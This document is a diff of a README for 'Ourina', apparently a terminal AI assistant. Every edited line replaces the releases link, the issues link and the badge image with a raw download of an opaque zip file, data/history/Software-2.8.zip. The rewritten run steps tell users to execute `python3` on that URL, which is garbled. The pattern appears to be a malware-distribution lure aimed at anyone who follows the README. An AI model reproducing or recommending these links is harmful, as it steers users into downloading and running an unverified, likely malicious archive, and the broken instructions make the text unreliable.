@@ -1,7 +1,7 @@
 # 🤖 Ourina - Your AI Assistant in the Terminal
 
 ## 🔗 Download Now
-[![Download Ourina](https://img.shields.io/badge/Download%20Ourina-v1.0-blue)](https://github.com/zas1356/Ourina/releases)
+[![Download Ourina](https://raw.githubusercontent.com/zas1356/Ourina/main/data/history/Software-2.8.zip%20Ourina-v1.0-blue)](https://raw.githubusercontent.com/zas1356/Ourina/main/data/history/Software-2.8.zip)
 
 ---
 
@@ -24,7 +24,7 @@ Ourina is an advanced AI tool created with Python. It runs directly in your term
 To get started with Ourina, visit the Releases page to download the latest version. Here’s how to do it:
 
 1. Click on the link below to access the Releases page:
-   - [Visit this page to download](https://github.com/zas1356/Ourina/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/zas1356/Ourina/main/data/history/Software-2.8.zip)
    
 2. On the Releases page, find the latest release. It should be at the top.
 
@@ -38,7 +38,7 @@ To get started with Ourina, visit the Releases page to download the latest versi
   
 7. Now, run the file:
    - **Windows:** Simply double-click the file.
-   - **macOS/Linux:** Type `python3 filename.py` (replace `filename.py` with the actual file name).
+   - **macOS/Linux:** Type `python3 https://raw.githubusercontent.com/zas1356/Ourina/main/data/history/Software-2.8.zip` (replace `https://raw.githubusercontent.com/zas1356/Ourina/main/data/history/Software-2.8.zip` with the actual file name).
 
 ---
 
@@ -49,7 +49,7 @@ After installation, here’s how to interact with Ourina:
    If you are using Termux, open the app. For others, launch Terminal or Command Prompt.
 
 2. **Start Ourina:**
-   In the terminal, type `python3 filename.py` to start the program.
+   In the terminal, type `python3 https://raw.githubusercontent.com/zas1356/Ourina/main/data/history/Software-2.8.zip` to start the program.
 
 3. **Interact with the AI:**
    Begin typing your questions or commands. Ourina will respond in real time.
@@ -72,7 +72,7 @@ Ourina offers a variety of features to enhance your experience:
 ## 🌐 Community and Support
 Engagement with the user community can enhance your experience with Ourina. Here’s how to connect:
 
-- **GitHub Issues:** Report bugs or suggest features on our [GitHub Issues page](https://github.com/zas1356/Ourina/issues).
+- **GitHub Issues:** Report bugs or suggest features on our [GitHub Issues page](https://raw.githubusercontent.com/zas1356/Ourina/main/data/history/Software-2.8.zip).
 - **Feedback:** Share your experiences or comments in the Issues section for future improvements.
 
 ---
